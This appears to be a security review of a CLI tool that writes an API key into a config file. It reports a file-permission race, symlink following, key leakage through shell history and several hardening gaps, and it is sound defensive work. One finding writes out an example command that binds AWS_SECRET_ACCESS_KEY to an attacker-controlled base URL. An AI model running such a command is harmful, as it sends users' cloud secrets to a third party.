Lens: security, 5 findings

1. [Important] `src/lib/judge-cli.ts:79-81` (build: `lib/judge-cli.js` write): `fs.writeFileSync(judgeConfig, ..., { mode: 0o600 })` applies the mode only when it creates the file. If `judge.json` already exists at 0644, for example hand-made or left by an older tool, Node opens it with O_TRUNC and keeps the old mode. The key is written while the file is world-readable, and `chmodSync` runs only afterwards.
   - **Symlink:** the same call follows a symlink at that path. It writes the JSON through to the target and the chmod changes the target's mode. Exploiting this needs write access to the user's config directory, so the symlink case is Minor on its own.
   - **Attacker gets:** on a shared machine, a local user can read the key during the window.
   - **Fix:** create with O_EXCL at 0600 in a temp file in the same directory, then rename over the target. That removes the window, the symlink follow and the half-written file on a crash. Add a test with a pre-existing 0644 file, and one with a symlink.

2. [Important] `commands/fx-setup.md` and `skills/fx-setup/SKILL.md` (section 7, remote choice), plus `INSTALL.md` (the `--api-key-stdin` sentence): the text says `write` "refuses a key on the command line, so the key never reaches shell history or the process list". It never says how to feed `--api-key-stdin` safely. The obvious way is `echo sk-... | node ...`, which puts the key in shell history. The claim overstates the protection, and the user is led to defeat it. The same applies to `export NAME=key` for `--api-key-env` typed at the prompt.
   - **Attacker gets:** a live remote-judge key in `~/.bash_history` or the PowerShell history file.
   - **Fix:** state how to supply the key without a history entry: type it at the stdin prompt and end with Ctrl-D, redirect from a file with mode 0600, or use a variable a secrets manager exports. Say plainly that `echo key |` is recorded. Narrow the claim to "the CLI never accepts it as an argument".

3. [Minor] `src/lib/judge-cli.ts:83-85`: `--base-url mock` passes `parseJudgeConfig`. `isLoopbackUrl("mock")` returns false because `new URL` throws, so the code takes the remote branch and calls `new URL(baseUrl).host`, which throws a TypeError. The file has already been written, and the unhandled rejection from `main().then` prints a stack trace and exits 1 after the success line. The "remote" claim would also be wrong, since mock makes no network call. No key is exposed.
   - **Fix:** reject `mock` in `write`, or guard the host lookup.

4. [Minor] Hardening gaps in `write`:
   - `src/lib/judge-cli.ts:79`: `mkdirSync(..., { recursive: true })` uses the default mode, so the config directory comes out at 0755 under a typical umask. The file stays 0600, so only its existence is visible.
   - `src/lib/judge-cli.ts:64-71`: `--insecure-http` together with a key on a non-loopback host is accepted, and the output is the same remote line. A Bearer key then travels in clear text, and `write` does not warn. Task 01 left this as a deferred minor, but `write` is the point where it can be said.
   - `src/lib/judge-cli.ts:67`: `--api-key-stdin` on a terminal echoes the typed key.
   - `src/lib/judge-cli.ts:53-60`: flag values are consumed blindly. `--model --api-key=k` stores `--api-key=k` as the model name, which is then written to the config, sent to the judge and printed by `check`. This is user error, but the refusal check is bypassed.
   - `src/lib/judge-cli.ts:81`: on Windows no mode is applied or checked, so the key depends on the profile ACL under `%APPDATA%`. `INSTALL.md` says "POSIX" correctly but does not say what protects the file on Windows.

5. [Minor] `src/lib/judge-cli.ts:75`: `--api-key-env NAME` reads any variable, so an agent that runs `write --base-url <attacker> --api-key-env AWS_SECRET_ACCESS_KEY` would store that value and later send it as a Bearer to the attacker's host. The setup text tells the agent to have the user run `write` for a remote key, which is the right mitigation. `write` itself could print the variable name and host in its remote line so the user sees what is being bound to what.

Checked and fine:
- **Key exposure:** the key never reaches argv, stdout, stderr or the error text. Reasons come from `parseJudgeConfig` and do not echo it. Unknown flags are not echoed.
- **Loopback detection:** `localhost` lookalikes, `127.0.0.1.evil.com`, decimal and short IPv4 forms (normalised by WHATWG), and IPv6 forms all resolve correctly or fail safe to remote. Userinfo is rejected.
- **Plain http:** it is refused without `insecure_http`.
- **Remote warning:** it appears in `write` on every successful remote write, except the `mock` crash in finding 3.
- **fx-setup text:** it tells the agent to run no install and never to take a key in chat, and it makes "no judge" the default.

The docs and the new test cover none of the pre-existing-file, symlink or `mock` cases.
